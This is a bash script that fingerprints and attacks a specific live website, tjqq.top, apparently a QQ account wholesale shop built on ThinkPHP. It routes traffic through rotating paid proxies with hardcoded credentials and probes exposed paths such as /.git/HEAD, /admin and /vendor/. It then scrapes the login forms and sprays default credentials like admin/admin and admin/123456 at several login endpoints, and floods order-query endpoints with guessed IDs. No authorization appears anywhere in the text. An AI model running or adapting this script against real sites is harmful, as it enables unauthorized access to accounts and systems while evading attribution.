#!/bin/bash
# tjqq.top deep fingerprint — not rainbow; ThinkPHP-style QQ wholesale
set -u
KEY=C413ED6D; PWD=344F550A6F8B
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://tjqq.top
CK=/tmp/tjqq2.ck
OUT=/tmp/tjqq2_out
LOG=/tmp/tjqq2.log
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
exec > >(tee "$LOG") 2>&1

refresh(){
  RESP=$(curl -s --connect-timeout 5 --max-time 10 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception:
 print('')" "$RESP")
  [[ -n "$SERVER" ]] && PROXY_URL="http://${KEY}:${PWD}@${SERVER}"
  echo "PROXY=$PROXY_URL"
}
c(){ curl -sk --connect-timeout 5 --max-time 25 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" "$@"; }

for i in 1 2 3 4 5 6; do
  refresh
  code=$(curl -sk --max-time 25 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -o "$OUT/home.html" -w "%{http_code}" "$BASE/")
  echo WARM=$code
  [[ "$code" == "200" ]] && break
done

echo "=== key pages ==="
for p in \
  /User_Login.html /User_Reg.html /User_Index.html \
  /Query.html /Gd_Query.html /News_List.html \
  /Item/2.html /Item/3.html /Item/5.html /Item/6.html \
  /Trade/65.html /Trade/56.html /Trade/43.html \
  /public/static/js/jquery.js \
  /robots.txt /sitemap.xml /.git/HEAD /composer.json \
  /api/ /Api/ /index.php /index/index /index/user/login \
  /user/login /user/reg /admin /Admin /manage /console; do
  code=$(c -o "$OUT/body.tmp" -w "%{http_code}:%{size_download}" "$BASE$p")
  body=$(head -c 160 "$OUT/body.tmp" | tr '\n' ' ')
  echo "P $p => $code $body"
done

echo "=== login page parse ==="
c "$BASE/User_Login.html" -o "$OUT/login.html" -w "login=%{http_code}:%{size_download}\n"
c "$BASE/User_Reg.html" -o "$OUT/reg.html" -w "reg=%{http_code}:%{size_download}\n"
c "$BASE/Query.html" -o "$OUT/query.html" -w "query=%{http_code}:%{size_download}\n"
c "$BASE/Gd_Query.html" -o "$OUT/gdquery.html" -w "gdq=%{http_code}:%{size_download}\n"
c "$BASE/Trade/65.html" -o "$OUT/trade65.html" -w "trade=%{http_code}:%{size_download}\n"
c "$BASE/Item/2.html" -o "$OUT/item2.html" -w "item=%{http_code}:%{size_download}\n"

python3 - <<'PY'
import re,os,json
out='/tmp/tjqq2_out'
for fn in ['login.html','reg.html','query.html','gdquery.html','trade65.html','item2.html','home.html']:
  fp=f'{out}/{fn}'
  if not os.path.exists(fp): continue
  h=open(fp,encoding='utf-8',errors='ignore').read()
  print('====', fn, 'len', len(h))
  t=re.search(r'<title>([^<]+)',h)
  print(' title', t.group(1).strip() if t else None)
  print(' forms', re.findall(r'<form[^>]*>', h)[:8])
  print(' actions', re.findall(r'action=["\']([^"\']+)["\']', h)[:10])
  print(' inputs', re.findall(r'name=["\']([^"\']+)["\']', h)[:30])
  print(' ajax/url', re.findall(r'url\s*:\s*["\']([^"\']+)["\']|\$\.(?:post|get|ajax)\([\'"]([^\'"]+)', h)[:20])
  for kw in ['captcha','geetest','token','password','verify','layui','think','__token__','csrf']:
    if kw.lower() in h.lower(): print(' has', kw)
  # endpoints in JS
  eps=re.findall(r'["\'](/[A-Za-z0-9_./?-]+)["\']', h)
  interesting=[e for e in eps if any(x in e.lower() for x in ['user','login','api','order','query','trade','pay','buy','goods','item'])]
  print(' eps', list(dict.fromkeys(interesting))[:40])
  text=re.sub(r'<script[\s\S]*?</script>',' ',h)
  text=re.sub(r'<[^>]+>',' ',text)
  text=re.sub(r'\s+',' ',text)
  print(' text', text[:350])
PY

echo "=== probe common API paths ==="
for p in \
  /User/login /User/Login /user/login.html \
  /index/user/login /index.php/user/login \
  /api/user/login /Api/User/login \
  /User_Login /User_DoLogin.html /User_Ajax.html \
  /Order_Query.html /Order/query /order/query \
  /Pay/ /pay/ /Payment/ \
  /Goods/ /goods/list /Item/list \
  /public/ /runtime/ /application/ \
  /ThinkPHP/ /vendor/ /wp-login.php; do
  code=$(c -o /tmp/tj_pb -w "%{http_code}:%{size_download}" "$BASE$p")
  # skip boring 404 15-byte
  sz=$(echo "$code" | cut -d: -f2)
  if [[ "$sz" != "15" && "$sz" != "0" ]]; then
    body=$(head -c 120 /tmp/tj_pb | tr '\n' ' ')
    echo "HITISH $p => $code $body"
  else
    echo "miss $p => $code"
  fi
done

echo "=== login POST spray shapes ==="
# try extract login endpoint from login.html JS
python3 - <<'PY'
import re
h=open('/tmp/tjqq2_out/login.html',encoding='utf-8',errors='ignore').read()
open('/tmp/tjqq2_out/login_js_urls.txt','w').write('\n'.join(re.findall(r'["\']([^"\']*(?:login|Login|user|User|ajax)[^"\']*)["\']', h)))
print(open('/tmp/tjqq2_out/login_js_urls.txt').read()[:1000])
PY

# generic weak login attempts if we find endpoint
for url in /User_Login.html /User/login /index/user/login /api/user/login; do
  for data in "username=admin&password=admin" "user=admin&pass=admin" "account=admin&password=123456" "username=admin&password=123456&captcha=0000"; do
    r=$(c -X POST -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type: application/x-www-form-urlencoded' -d "$data" "$BASE$url")
    [[ -n "$r" && "$r" != "404 - Not Found" ]] && echo "LOGINPOST $url [$data] => ${r:0:200}"
  done
done

echo "=== query page POST ==="
for url in /Query.html /Gd_Query.html /Order_Query.html; do
  for data in "order=123456" "orderno=123456" "qq=123456" "keyword=123456" "id=1"; do
    r=$(c -X POST -H 'X-Requested-With: XMLHttpRequest' -d "$data" "$BASE$url")
    [[ -n "$r" && ${#r} -gt 20 ]] && echo "QPOST $url [$data] => ${r:0:220}"
  done
done

echo "=== headers / server ==="
c -I "$BASE/" -o /tmp/tj_hdr -w "HDRCODE=%{http_code}\n"
cat /tmp/tj_hdr | head -30
echo "remote resolve"
getent ahosts tjqq.top | head -5

echo "===== PROBE2 DONE ====="
ls -la "$OUT" | head
